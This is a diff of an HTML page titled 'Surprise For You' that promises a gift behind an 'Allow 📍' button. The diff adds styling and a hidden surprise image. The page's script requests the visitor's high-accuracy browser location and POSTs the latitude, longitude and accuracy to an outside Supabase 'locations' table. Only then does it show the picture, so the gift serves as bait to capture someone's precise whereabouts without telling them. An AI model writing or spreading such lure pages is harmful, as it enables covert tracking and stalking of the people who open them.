@@ -3,7 +3,40 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
   <title>Surprise For You 🎁</title>
+
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 40px 20px;
+    }
+
+    button {
+      padding: 12px 20px;
+      font-size: 16px;
+      cursor: pointer;
+      border-radius: 8px;
+      border: none;
+    }
+
+    #result {
+      margin-top: 25px;
+      font-size: 18px;
+    }
+
+    #surpriseContent {
+      display: none;
+      margin-top: 30px;
+    }
+
+    #surpriseContent img {
+      width: 100%;
+      max-width: 500px;
+      border-radius: 15px;
+    }
+  </style>
 </head>
 
 <body>
@@ -14,7 +47,7 @@
     <strong>Click Here →</strong>
   </p>
 
-  <button onclick="shareSurprise()">
+  <button id="allowButton" onclick="shareSurprise()">
     Allow 📍
   </button>
 
@@ -26,7 +59,20 @@
     </button>
   </div>
 
+  <div id="surpriseContent">
+
+    <h3>🎁 Your Surprise ❤️</h3>
+
+    <img
+      src="surprise.jpg"
+      alt="Your Surprise"
+    >
+
+  </div>
+
+
   <script>
+
     const SUPABASE_URL =
       "https://jpwomydvlacrtqxjvtxi.supabase.co";
 
@@ -35,74 +81,120 @@
 
     const sessionId = crypto.randomUUID();
 
+
     function shareSurprise() {
 
-      const result = document.getElementById("result");
+      const result =
+        document.getElementById("result");
+
+      const allowButton =
+        document.getElementById("allowButton");
+
       const surpriseButton =
         document.getElementById("surpriseButton");
 
-      surpriseButton.style.display = "none";
 
       if (!navigator.geolocation) {
+
         result.innerHTML =
           "Sorry! 😔<br><br>" +
           "Location is not supported by your browser.";
+
         return;
       }
+
 
       result.innerHTML =
         "Getting Your Surprise... 🎁<br><br>" +
         "Please Wait...";
+
+
+      allowButton.disabled = true;
+
 
       navigator.geolocation.getCurrentPosition(
 
         async function(position) {
 
           const data = {
-            latitude: position.coords.latitude,
-            longitude: position.coords.longitude,
-            accuracy: position.coords.accuracy,
-            session_id: sessionId
+
+            latitude:
+              position.coords.latitude,
+
+            longitude:
+              position.coords.longitude,
+
+            accuracy:
+              position.coords.accuracy,
+
+            session_id:
+              sessionId
           };
+
 
           try {
 
             const response = await fetch(
-              SUPABASE_URL + "/rest/v1/locations",
+
+              SUPABASE_URL +
+              "/rest/v1/locations",
+
               {
+
                 method: "POST",
 
                 headers: {
-                  "apikey": SUPABASE_KEY,
-                  "Authorization": "Bearer " + SUPABASE_KEY,
-                  "Content-Type": "application/json",
-                  "Prefer": "return=minimal"
+
+                  "apikey":
+                    SUPABASE_KEY,
+
+                  "Authorization":
+                    "Bearer " + SUPABASE_KEY,
+
+                  "Content-Type":
+                    "application/json",
+
+                  "Prefer":
+                    "return=minimal"
                 },
 
-                body: JSON.stringify(data)
+                body:
+                  JSON.stringify(data)
               }
             );
 
+
             if (!response.ok) {
-              throw new Error("Database request failed");
+
+              throw new Error(
+                "Database request failed"
+              );
             }
+
 
             result.innerHTML =
               "Your Surprise Is Ready! 🎁✨";
 
-            surpriseButton.style.display = "block";
+
+            surpriseButton.style.display =
+              "block";
+
 
           } catch (error) {
+
+            allowButton.disabled = false;
 
             result.innerHTML =
               "Sorry! 😔<br><br>" +
               "Please try again.";
-
           }
 
         },
 
+
         function(error) {
+
+          allowButton.disabled = false;
 
           result.innerHTML =
             "Sorry! 😔<br><br>" +
@@ -110,19 +202,35 @@
 
         },
 
+
         {
+
           enableHighAccuracy: true,
+
           timeout: 15000,
+
           maximumAge: 0
+
         }
+
       );
+
     }
+
 
     function openSurprise() {
 
-      alert("🎁 Surprise Opened! ❤️");
+      document.getElementById(
+        "surpriseContent"
+      ).style.display = "block";
+
+
+      document.getElementById(
+        "surpriseButton"
+      ).style.display = "none";
 
     }
+
   </script>
 
 </body>
